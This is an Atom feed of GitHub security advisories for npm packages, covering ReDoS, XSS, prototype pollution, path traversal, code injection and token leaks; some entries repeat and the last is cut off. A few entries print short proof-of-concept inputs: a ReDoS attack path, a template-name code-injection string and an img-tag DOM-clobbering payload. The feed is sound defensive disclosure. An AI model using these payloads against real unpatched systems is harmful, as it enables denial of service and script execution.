<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-09-10T12:02:07.985Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[angular] AngularJS allows attackers to bypass common image source restrictions]]></title>
        <id>https://github.com/advisories/GHSA-m9gf-397r-hwpg</id>
        <link href="https://github.com/advisories/GHSA-m9gf-397r-hwpg"/>
        <updated>2024-09-09T20:20:05.000Z</updated>
        <content type="html"><![CDATA[<p>Improper sanitization of the value of the <code>[srcset]</code> attribute in AngularJS allows attackers to bypass common image source restrictions, which can also lead to a form of  Content Spoofing <a href="https://owasp.org/www-community/attacks/Content_Spoofing">https://owasp.org/www-community/attacks/Content_Spoofing</a> .</p>
<p>This issue affects AngularJS versions 1.3.0-rc.4 and greater.</p>
<p>Note:
The AngularJS project is End-of-Life and will not receive any updates to address this issue. For more information see  here <a href="https://docs.angularjs.org/misc/version-support-status">https://docs.angularjs.org/misc/version-support-status</a> .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8372">https://nvd.nist.gov/vuln/detail/CVE-2024-8372</a></li>
<li><a href="https://codepen.io/herodevs/full/xxoQRNL/0072e627abe03e9cda373bc75b4c1017">https://codepen.io/herodevs/full/xxoQRNL/0072e627abe03e9cda373bc75b4c1017</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-8372">https://www.herodevs.com/vulnerability-directory/cve-2024-8372</a></li>
<li><a href="https://github.com/advisories/GHSA-m9gf-397r-hwpg">https://github.com/advisories/GHSA-m9gf-397r-hwpg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9gf-397r-hwpg</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-09T15:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[path-to-regexp] path-to-regexp outputs backtracking regular expressions]]></title>
        <id>https://github.com/advisories/GHSA-9wv6-86v2-598j</id>
        <link href="https://github.com/advisories/GHSA-9wv6-86v2-598j"/>
        <updated>2024-09-09T21:45:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In certain cases, <code>path-to-regexp</code> will output a regular expression that can be exploited to cause poor performance.</p>
<h3 id="patches">Patches</h3>
<p>For users of 0.1, upgrade to <code>0.1.10</code>. All other users should upgrade to <code>8.0.0</code>. </p>
<p>Version 0.1.10 adds backtracking protection when a custom regular expression is not provided, so it's still possible to manually create a ReDoS vulnerability if you are providing custom regular expressions.</p>
<p>Version 8.0.0 removes all features that can cause a ReDoS and stops exposing the regular expression directly.</p>
<h3 id="workarounds">Workarounds</h3>
<p>All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change <code>/:a-:b</code> to <code>/:a-:b([^-/]+)</code>.</p>
<p>If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.</p>
<h3 id="details">Details</h3>
<p>Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.</p>
<p>The bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (<code>.</code>). For example, <code>/:a-:b</code> will produce the regular expression <code>/^\/([^\/]+?)-([^\/]+?)\/?$/</code>. This can be exploited by a path such as <code>/a${'-a'.repeat(8_000)}/a</code>. <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP</a> has a good example of why this occurs, but the TL;DR is the <code>/a</code> at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the <code>:a-:b</code> on the repeated 8,000 <code>-a</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos/">Detailed blog post</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j">https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j</a></li>
<li><a href="https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f">https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f</a></li>
<li><a href="https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6">https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45296">https://nvd.nist.gov/vuln/detail/CVE-2024-45296</a></li>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">https://github.com/advisories/GHSA-9wv6-86v2-598j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9wv6-86v2-598j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-09T20:19:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[path-to-regexp] path-to-regexp outputs backtracking regular expressions]]></title>
        <id>https://github.com/advisories/GHSA-9wv6-86v2-598j</id>
        <link href="https://github.com/advisories/GHSA-9wv6-86v2-598j"/>
        <updated>2024-09-09T21:45:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In certain cases, <code>path-to-regexp</code> will output a regular expression that can be exploited to cause poor performance.</p>
<h3 id="patches">Patches</h3>
<p>For users of 0.1, upgrade to <code>0.1.10</code>. All other users should upgrade to <code>8.0.0</code>. </p>
<p>Version 0.1.10 adds backtracking protection when a custom regular expression is not provided, so it's still possible to manually create a ReDoS vulnerability if you are providing custom regular expressions.</p>
<p>Version 8.0.0 removes all features that can cause a ReDoS and stops exposing the regular expression directly.</p>
<h3 id="workarounds">Workarounds</h3>
<p>All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change <code>/:a-:b</code> to <code>/:a-:b([^-/]+)</code>.</p>
<p>If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.</p>
<h3 id="details">Details</h3>
<p>Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.</p>
<p>The bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (<code>.</code>). For example, <code>/:a-:b</code> will produce the regular expression <code>/^\/([^\/]+?)-([^\/]+?)\/?$/</code>. This can be exploited by a path such as <code>/a${'-a'.repeat(8_000)}/a</code>. <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP</a> has a good example of why this occurs, but the TL;DR is the <code>/a</code> at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the <code>:a-:b</code> on the repeated 8,000 <code>-a</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP</a></li>
<li><a href="https://blakeembrey.com/posts/2024-09-web-redos/">Detailed blog post</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j">https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-9wv6-86v2-598j</a></li>
<li><a href="https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f">https://github.com/pillarjs/path-to-regexp/commit/29b96b4a1de52824e1ca0f49a701183cc4ed476f</a></li>
<li><a href="https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6">https://github.com/pillarjs/path-to-regexp/commit/60f2121e9b66b7b622cc01080df0aabda9eedee6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45296">https://nvd.nist.gov/vuln/detail/CVE-2024-45296</a></li>
<li><a href="https://github.com/advisories/GHSA-9wv6-86v2-598j">https://github.com/advisories/GHSA-9wv6-86v2-598j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9wv6-86v2-598j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-09T20:19:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[angular] AngularJS allows attackers to bypass common image source restrictions]]></title>
        <id>https://github.com/advisories/GHSA-mqm9-c95h-x2p6</id>
        <link href="https://github.com/advisories/GHSA-mqm9-c95h-x2p6"/>
        <updated>2024-09-09T20:20:05.000Z</updated>
        <content type="html"><![CDATA[<p>Improper sanitization of the value of the <code>[srcset]</code> attribute in <code>&lt;source&gt;</code> HTML elements in AngularJS allows attackers to bypass common image source restrictions, which can also lead to a form of  Content Spoofing <a href="https://owasp.org/www-community/attacks/Content_Spoofing">https://owasp.org/www-community/attacks/Content_Spoofing</a> .</p>
<p>This issue affects all versions of AngularJS.</p>
<p>Note:
The AngularJS project is End-of-Life and will not receive any updates to address this issue. For more information see  here <a href="https://docs.angularjs.org/misc/version-support-status">https://docs.angularjs.org/misc/version-support-status</a> .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8373">https://nvd.nist.gov/vuln/detail/CVE-2024-8373</a></li>
<li><a href="https://codepen.io/herodevs/full/bGPQgMp/8da9ce87e99403ee13a295c305ebfa0b">https://codepen.io/herodevs/full/bGPQgMp/8da9ce87e99403ee13a295c305ebfa0b</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-8373">https://www.herodevs.com/vulnerability-directory/cve-2024-8373</a></li>
<li><a href="https://github.com/advisories/GHSA-mqm9-c95h-x2p6">https://github.com/advisories/GHSA-mqm9-c95h-x2p6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mqm9-c95h-x2p6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-09-09T15:30:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bootstrap] Bootstrap Cross-Site Scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</id>
        <link href="https://github.com/advisories/GHSA-vc8w-jr9v-vj7f"/>
        <updated>2024-09-06T19:07:45.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been identified in Bootstrap that exposes users to Cross-Site Scripting (XSS) attacks. The issue is present in the carousel component, where the data-slide and data-slide-to attributes can be exploited through the href attribute of an <a> tag due to inadequate sanitization. This vulnerability could potentially enable attackers to execute arbitrary JavaScript within the victim's browser.</a></p><a>
<h3 id="references">References</h3>
</a><ul><a>
</a><li><a></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6531">https://nvd.nist.gov/vuln/detail/CVE-2024-6531</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-6531">https://www.herodevs.com/vulnerability-directory/cve-2024-6531</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-vc8w-jr9v-vj7f">https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vc8w-jr9v-vj7f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-11T18:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@actions/artifact] @actions/artifact has an Arbitrary File Write via artifact extraction]]></title>
        <id>https://github.com/advisories/GHSA-6q32-hq47-5qq3</id>
        <link href="https://github.com/advisories/GHSA-6q32-hq47-5qq3"/>
        <updated>2024-09-04T18:08:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Versions of <code>actions/artifact</code> before 2.1.7 are vulnerable to arbitrary file write when using <code>downloadArtifactInternal</code>, <code>downloadArtifactPublic</code>, or <code>streamExtractExternal</code> for extracting a specifically crafted artifact that contains path traversal filenames.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to version 2.1.7 or higher. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/actions/toolkit/pull/1724">https://github.com/actions/toolkit/pull/1724</a></li>
</ul>
<h3 id="cve">CVE</h3>
<p>CVE-2024-42471</p>
<h3 id="credits">Credits</h3>
<p>Justin Taft from Google</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/actions/toolkit/security/advisories/GHSA-6q32-hq47-5qq3">https://github.com/actions/toolkit/security/advisories/GHSA-6q32-hq47-5qq3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42471">https://nvd.nist.gov/vuln/detail/CVE-2024-42471</a></li>
<li><a href="https://github.com/actions/toolkit/pull/1724">https://github.com/actions/toolkit/pull/1724</a></li>
<li><a href="https://github.com/actions/toolkit/commit/29885a805ef3e95a9862dcaa8431c30981960017">https://github.com/actions/toolkit/commit/29885a805ef3e95a9862dcaa8431c30981960017</a></li>
<li><a href="https://snyk.io/research/zip-slip-vulnerability">https://snyk.io/research/zip-slip-vulnerability</a></li>
<li><a href="https://github.com/actions/toolkit/pull/1602">https://github.com/actions/toolkit/pull/1602</a></li>
<li><a href="https://github.com/actions/download-artifact/blob/v3/package.json#L31">https://github.com/actions/download-artifact/blob/v3/package.json#L31</a></li>
<li><a href="https://github.com/advisories/GHSA-6q32-hq47-5qq3">https://github.com/advisories/GHSA-6q32-hq47-5qq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q32-hq47-5qq3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T20:08:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ag-grid-community] Prototype pollution in ag-grid-community via the _.mergeDeep function]]></title>
        <id>https://github.com/advisories/GHSA-876p-c77m-x2hc</id>
        <link href="https://github.com/advisories/GHSA-876p-c77m-x2hc"/>
        <updated>2024-09-04T16:39:11.000Z</updated>
        <content type="html"><![CDATA[<p>ag-grid-community v31.3.2 and ag-grid-enterprise v31.3.2 were discovered to contain a prototype pollution via the _.mergeDeep function. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties. Prior versions were also found to be affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38996">https://nvd.nist.gov/vuln/detail/CVE-2024-38996</a></li>
<li><a href="https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa">https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa</a></li>
<li><a href="https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b">https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b</a></li>
<li><a href="https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b">https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b</a></li>
<li><a href="https://github.com/ag-grid/ag-grid/pull/8290">https://github.com/ag-grid/ag-grid/pull/8290</a></li>
<li><a href="https://github.com/advisories/GHSA-876p-c77m-x2hc">https://github.com/advisories/GHSA-876p-c77m-x2hc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-876p-c77m-x2hc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-01T15:32:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ag-grid-enterprise] Prototype pollution in ag-grid-community via the _.mergeDeep function]]></title>
        <id>https://github.com/advisories/GHSA-876p-c77m-x2hc</id>
        <link href="https://github.com/advisories/GHSA-876p-c77m-x2hc"/>
        <updated>2024-09-04T16:39:11.000Z</updated>
        <content type="html"><![CDATA[<p>ag-grid-community v31.3.2 and ag-grid-enterprise v31.3.2 were discovered to contain a prototype pollution via the _.mergeDeep function. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties. Prior versions were also found to be affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38996">https://nvd.nist.gov/vuln/detail/CVE-2024-38996</a></li>
<li><a href="https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa">https://gist.github.com/mestrtee/18e8c27f3a6376e7cf082cfe1ca766fa</a></li>
<li><a href="https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b">https://gist.github.com/mestrtee/c1590660750744f25e86ba1bf240844b</a></li>
<li><a href="https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b">https://gist.github.com/mestrtee/f8037d492dab0d77bca719e05d31c08b</a></li>
<li><a href="https://github.com/ag-grid/ag-grid/pull/8290">https://github.com/ag-grid/ag-grid/pull/8290</a></li>
<li><a href="https://github.com/advisories/GHSA-876p-c77m-x2hc">https://github.com/advisories/GHSA-876p-c77m-x2hc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-876p-c77m-x2hc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-01T15:32:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urlregex] ReDoS in urlregex]]></title>
        <id>https://github.com/advisories/GHSA-rw72-v6c7-hf9r</id>
        <link href="https://github.com/advisories/GHSA-rw72-v6c7-hf9r"/>
        <updated>2024-09-03T21:03:10.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in nescalante urlregex up to 0.5.0 and classified as problematic. This issue affects some unknown processing of the file index.js of the component Backtracking. The manipulation leads to inefficient regular expression complexity. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 0.5.1 is able to address this issue. The identifier of the patch is e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-36830">https://nvd.nist.gov/vuln/detail/CVE-2020-36830</a></li>
<li><a href="https://github.com/nescalante/urlregex/pull/8">https://github.com/nescalante/urlregex/pull/8</a></li>
<li><a href="https://github.com/nescalante/urlregex/commit/e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9">https://github.com/nescalante/urlregex/commit/e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9</a></li>
<li><a href="https://github.com/nescalante/urlregex/releases/tag/v0.5.1">https://github.com/nescalante/urlregex/releases/tag/v0.5.1</a></li>
<li><a href="https://vuldb.com/?ctiid.276269">https://vuldb.com/?ctiid.276269</a></li>
<li><a href="https://vuldb.com/?id.276269">https://vuldb.com/?id.276269</a></li>
<li><a href="https://github.com/advisories/GHSA-rw72-v6c7-hf9r">https://github.com/advisories/GHSA-rw72-v6c7-hf9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rw72-v6c7-hf9r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-02T18:31:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@blakeembrey/template] @blakeembrey/template vulnerable to code injection when attacker controls template input]]></title>
        <id>https://github.com/advisories/GHSA-q765-wm9j-66qj</id>
        <link href="https://github.com/advisories/GHSA-q765-wm9j-66qj"/>
        <updated>2024-09-03T21:45:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>It is possible to inject and run code within the template if the attacker has access to write the template name.</p>
<pre><code class="language-js">const { template } = require('@blakeembrey/template');

template("Hello {{name}}!", "exploit() {} &amp;&amp; ((()=&gt;{ console.log('success'); })()) &amp;&amp; function pwned");
</code></pre>
<h3 id="patches">Patches</h3>
<p>Upgrade to 1.2.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Don't pass untrusted input as the template display name, or don't use the display name feature.</p>
<h3 id="references">References</h3>
<p>Fixed by removing in <a href="https://github.com/blakeembrey/js-template/commit/b8d9aa999e464816c6cfb14acd1ad0f5d1e335aa">https://github.com/blakeembrey/js-template/commit/b8d9aa999e464816c6cfb14acd1ad0f5d1e335aa</a>.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/blakeembrey/js-template/security/advisories/GHSA-q765-wm9j-66qj">https://github.com/blakeembrey/js-template/security/advisories/GHSA-q765-wm9j-66qj</a></li>
<li><a href="https://github.com/blakeembrey/js-template/commit/b8d9aa999e464816c6cfb14acd1ad0f5d1e335aa">https://github.com/blakeembrey/js-template/commit/b8d9aa999e464816c6cfb14acd1ad0f5d1e335aa</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45390">https://nvd.nist.gov/vuln/detail/CVE-2024-45390</a></li>
<li><a href="https://github.com/advisories/GHSA-q765-wm9j-66qj">https://github.com/advisories/GHSA-q765-wm9j-66qj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q765-wm9j-66qj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T19:42:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tinacms/cli] Tina search token leak via lock file in TinaCMS]]></title>
        <id>https://github.com/advisories/GHSA-4qrm-9h4r-v2fx</id>
        <link href="https://github.com/advisories/GHSA-4qrm-9h4r-v2fx"/>
        <updated>2024-09-04T00:40:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Tina search token leaked via lock file (tina-lock.json) in TinaCMS. Sites building with @tinacms/cli &lt; 1.6.2 that use a search token are impacted.</p>
<p>If your Tina-enabled website has search setup, you should rotate that key immediately.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been patched in @tinacms/<a href="mailto:cli@1.6.2">cli@1.6.2</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrading, and rotating search token is required for the proper fix.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/tinacms/tinacms/pull/4758">https://github.com/tinacms/tinacms/pull/4758</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tinacms/tinacms/security/advisories/GHSA-4qrm-9h4r-v2fx">https://github.com/tinacms/tinacms/security/advisories/GHSA-4qrm-9h4r-v2fx</a></li>
<li><a href="https://github.com/tinacms/tinacms/pull/4758">https://github.com/tinacms/tinacms/pull/4758</a></li>
<li><a href="https://github.com/tinacms/tinacms/commit/110f1ceea4574d636a64526648f7c8bf6539b26a">https://github.com/tinacms/tinacms/commit/110f1ceea4574d636a64526648f7c8bf6539b26a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45391">https://nvd.nist.gov/vuln/detail/CVE-2024-45391</a></li>
<li><a href="https://github.com/advisories/GHSA-4qrm-9h4r-v2fx">https://github.com/advisories/GHSA-4qrm-9h4r-v2fx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4qrm-9h4r-v2fx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-03T19:41:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@pagefind/modular-ui] DOM clobbering could escalate to Cross-site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</id>
        <link href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx"/>
        <updated>2024-09-03T21:45:33.000Z</updated>
        <content type="html"><![CDATA[<p>Pagefind initializes its dynamic JavaScript and WebAssembly files relative to the location of the first script you load. This information is gathered by looking up the value of <code>document.currentScript.src</code>.</p>
<p>It is possible to "clobber" this lookup with otherwise benign HTML on the page, for example:</p>
<pre><code class="language-html">&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;
</code></pre>
<p>This will cause <code>document.currentScript.src</code> to resolve as an external domain, which will then be used by Pagefind to load dependencies.</p>
<p>This exploit would only work in the case that an attacker could inject HTML to your live, hosted, website. In these cases, this would act as a way to escalate the privilege available to an attacker. This assumes they have the ability to add some elements to the page (for example, <code>img</code> tags with a <code>name</code> attribute), but not others, as adding a <code>script</code> to the page would itself be the XSS vector.</p>
<p>Pagefind has tightened this resolution by ensuring the source is loaded from a valid script element. There are no reports of this being exploited in the wild via Pagefind.</p>
<h3 id="original-report">Original Report</h3>
<p>If an attacker can inject benign html, such as:
<code>&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;</code></p>
<p>they can clobber <code>document.currentScript.src</code> leading to XSS in your library.</p>
<p>Here is the same attack on webpack that was accepted: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb">https://github.com/CloudCannon/pagefind/commit/14ec96864eabaf1d7d809d5da0186a8856261eeb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45389">https://nvd.nist.gov/vuln/detail/CVE-2024-45389</a></li>
<li><a href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/advisories/GHSA-gprj-6m2f-j9hx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-03T19:33:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@pagefind/default-ui] DOM clobbering could escalate to Cross-site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-gprj-6m2f-j9hx</id>
        <link href="https://github.com/advisories/GHSA-gprj-6m2f-j9hx"/>
        <updated>2024-09-03T21:45:33.000Z</updated>
        <content type="html"><![CDATA[<p>Pagefind initializes its dynamic JavaScript and WebAssembly files relative to the location of the first script you load. This information is gathered by looking up the value of <code>document.currentScript.src</code>.</p>
<p>It is possible to "clobber" this lookup with otherwise benign HTML on the page, for example:</p>
<pre><code class="language-html">&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;
</code></pre>
<p>This will cause <code>document.currentScript.src</code> to resolve as an external domain, which will then be used by Pagefind to load dependencies.</p>
<p>This exploit would only work in the case that an attacker could inject HTML to your live, hosted, website. In these cases, this would act as a way to escalate the privilege available to an attacker. This assumes they have the ability to add some elements to the page (for example, <code>img</code> tags with a <code>name</code> attribute), but not others, as adding a <code>script</code> to the page would itself be the XSS vector.</p>
<p>Pagefind has tightened this resolution by ensuring the source is loaded from a valid script element. There are no reports of this being exploited in the wild via Pagefind.</p>
<h3 id="original-report">Original Report</h3>
<p>If an attacker can inject benign html, such as:
<code>&lt;img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"&gt;&lt;/img&gt;</code></p>
<p>they can clobber <code>document.currentScript.src</code> leading to XSS in your library.</p>
<p>Here is the same attack on webpack that was accepted: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx">https://github.com/CloudCannon/pagefind/security/advisories/GHSA-gprj-6m2f-j9hx</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
